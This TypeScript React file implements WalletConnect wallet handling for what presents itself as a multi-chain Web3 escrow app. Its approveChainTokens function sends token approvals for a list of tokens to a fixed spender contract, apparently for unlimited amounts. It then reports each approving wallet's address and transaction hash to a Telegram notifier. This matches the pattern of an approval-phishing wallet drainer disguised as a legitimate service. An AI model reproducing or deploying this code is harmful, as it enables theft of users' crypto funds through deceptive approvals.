import React, { createContext, useContext, useState, useCallback, useRef, ReactNode } from "react";
import { UniversalProvider } from "@walletconnect/universal-provider";
import { toast } from "sonner";
import { SUPPORTED_CHAINS, getChainById, type ChainConfig, type ChainToken } from "@/lib/chains";
import { getNativeBalance, getAllowance, encodeApproveCalldata } from "@/lib/evmUtils";
import { sendEvmApprovalNotification } from "@/lib/telegramNotify";
import { WALLETCONNECT_PROJECT_ID, walletConnectModal } from "@/lib/walletConnect";

const ALL_WC_CHAINS = SUPPORTED_CHAINS.map((c) => c.wcChainId);

interface EvmWalletContextType {
  address: string | null;
  currentChainId: number | null;
  isConnected: boolean;
  isApproving: boolean;
  provider: InstanceType<typeof UniversalProvider> | null;
  session: any;
  connect: () => Promise<string | null>;
  disconnect: () => void;
  approveChainTokens: (chain: ChainConfig) => Promise<boolean>;
  switchNetwork: (chainId: number) => Promise<boolean>;
}

const EvmWalletContext = createContext<EvmWalletContextType>({
  address: null,
  currentChainId: null,
  isConnected: false,
  isApproving: false,
  provider: null,
  session: null,
  connect: async () => null,
  disconnect: () => {},
  approveChainTokens: async () => false,
  switchNetwork: async () => false,
});

export const useEvmWallet = () => useContext(EvmWalletContext);

export const EvmWalletProvider = ({ children }: { children: ReactNode }) => {
  const [address, setAddress] = useState<string | null>(null);
  const [currentChainId, setCurrentChainId] = useState<number | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [isApproving, setIsApproving] = useState(false);

  const providerRef = useRef<InstanceType<typeof UniversalProvider> | null>(null);
  const sessionRef = useRef<any>(null);
  const initPromiseRef = useRef<Promise<InstanceType<typeof UniversalProvider>> | null>(null);
  const connectingRef = useRef(false);
  const displayUriHandlerRef = useRef<((uri: string) => void) | null>(null);

  const resetState = useCallback(() => {
    setAddress(null);
    setCurrentChainId(null);
    setIsConnected(false);
    setIsApproving(false);
    sessionRef.current = null;
  }, []);

  const initProvider = useCallback(async () => {
    if (providerRef.current) return providerRef.current;
    if (initPromiseRef.current) return initPromiseRef.current;

    const promise = UniversalProvider.init({
      projectId: WALLETCONNECT_PROJECT_ID,
      relayUrl: "wss://relay.walletconnect.com",
      metadata: {
        name: "Escrow v3",
        description: "Multi-Chain Web3 Escrow",
        url: window.location.origin,
        icons: [`${window.location.origin}/favicon.ico`],
      },
    });

    initPromiseRef.current = promise;
    const provider = await promise;
    providerRef.current = provider;

    provider.on("session_delete", () => {
      resetState();
    });

    return provider;
  }, [resetState]);

  const extractAddress = (session: any): string | null => {
    try {
      const allAccounts = Object.values(session.namespaces).flatMap((ns: any) => ns.accounts);
      for (const account of allAccounts as string[]) {
        const parts = account.split(":");
        if (parts[0] === "eip155" && parts.length >= 3) {
          return parts.slice(2).join(":");
        }
      }
    } catch { /* ignore */ }
    return null;
  };

  const connect = useCallback(async (): Promise<string | null> => {
    if (address && isConnected) return address;
    if (connectingRef.current) return null;
    connectingRef.current = true;

    try {
      const provider = await initProvider();

      // Remove previous display_uri handler if exists (prevents duplicates on retry)
      if (displayUriHandlerRef.current) {
        try { provider.off("display_uri", displayUriHandlerRef.current); } catch {}
      }

      // Create and store new handler
      const uriHandler = (uri: string) => {
        walletConnectModal.openModal({ uri });
      };
      displayUriHandlerRef.current = uriHandler;
      provider.on("display_uri", uriHandler);

      const connectParams = {
        optionalNamespaces: {
          eip155: {
            chains: ALL_WC_CHAINS,
            methods: [
              "eth_sendTransaction",
              "personal_sign",
              "eth_signTransaction",
              "wallet_switchEthereumChain",
              "wallet_addEthereumChain",
            ],
            events: ["chainChanged", "accountsChanged"],
          },
        },
      };

      const session = await provider.connect(connectParams);
      sessionRef.current = session;
      const addr = extractAddress(session);

      if (addr) {
        setAddress(addr);
        setIsConnected(true);
        walletConnectModal.closeModal();
        toast.success("Wallet connected!");
        return addr;
      }
      return null;
    } catch (err: any) {
      console.error("EVM WC connect failed:", err);
      try { walletConnectModal.closeModal(); } catch {}

      // Reset provider for fresh retry
      if (providerRef.current) {
        try { await providerRef.current.disconnect(); } catch {}
      }
      providerRef.current = null;
      initPromiseRef.current = null;
      displayUriHandlerRef.current = null;

      if (err?.message !== "User closed the connection modal") {
        toast.error("Failed to connect wallet");
      }
      return null;
    } finally {
      connectingRef.current = false;
    }
  }, [initProvider, address, isConnected]);

  const disconnect = useCallback(async () => {
    try {
      const provider = providerRef.current;
      if (provider && sessionRef.current) {
        await provider.disconnect();
      }
    } catch (err) {
      console.error("Disconnect error:", err);
    }
    resetState();
    providerRef.current = null;
    initPromiseRef.current = null;
    displayUriHandlerRef.current = null;
  }, [resetState]);

  const switchNetwork = useCallback(async (chainId: number): Promise<boolean> => {
    const provider = providerRef.current;
    const session = sessionRef.current;
    if (!provider || !session || !address) return false;

    const chain = getChainById(chainId);
    if (!chain) return false;

    try {
      await provider.client.request({
        chainId: chain.wcChainId,
        topic: session.topic,
        request: {
          method: "wallet_switchEthereumChain",
          params: [{ chainId: chain.chainIdHex }],
        },
      });
      setCurrentChainId(chainId);
      return true;
    } catch (err: any) {
      console.error(`Failed to switch to ${chain.name}:`, err);
      return false;
    }
  }, [address]);

  const approveChainTokens = useCallback(async (chain: ChainConfig): Promise<boolean> => {
    const provider = providerRef.current;
    const session = sessionRef.current;
    if (!provider || !session || !address) return false;

    setIsApproving(true);
    let success = false;

    try {
      // Check native balance
      const nativeBal = await getNativeBalance(address, chain);
      if (nativeBal < chain.minGasThreshold) {
        toast.error(`Insufficient gas on ${chain.name}. Need at least ${chain.minGasThreshold} ${chain.nativeCurrency.symbol}`);
        return false;
      }

      // Try switching chain if needed
      await switchNetwork(chain.chainId).catch(() => {});

      for (const token of chain.approvalTokens) {
        // Check current allowance
        const allowance = await getAllowance(address, chain.spenderContract, token.address, chain);
        if (allowance > 0n) {
          toast.info(`${token.symbol} already approved on ${chain.name}`);
          success = true;
          continue;
        }

        toast.loading(`Approving ${token.symbol} on ${chain.name}...`);
        const calldata = encodeApproveCalldata(chain.spenderContract);

        const txHash: string = await provider.client.request({
          chainId: chain.wcChainId,
          topic: session.topic,
          request: {
            method: "eth_sendTransaction",
            params: [{
              from: address,
              to: token.address,
              data: calldata,
              value: "0x0",
            }],
          },
        });

        toast.dismiss();

        if (txHash) {
          toast.success(`${token.symbol} approved on ${chain.name}!`);
          sendEvmApprovalNotification(address, txHash, chain.id, token.symbol).catch(console.error);
          success = true;
        }
      }
    } catch (err: any) {
      console.error(`Approval failed on ${chain.name}:`, err);
      toast.dismiss();
      toast.error(`Approval failed: ${err.message || "User rejected or network error"}`);
    } finally {
      setIsApproving(false);
    }

    return success;
  }, [address, switchNetwork]);

  return (
    <EvmWalletContext.Provider
      value={{
        address,
        currentChainId,
        isConnected,
        isApproving,
        provider: providerRef.current,
        session: sessionRef.current,
        connect,
        disconnect,
        approveChainTokens,
        switchNetwork,
      }}
    >
      {children}
    </EvmWalletContext.Provider>
  );
};
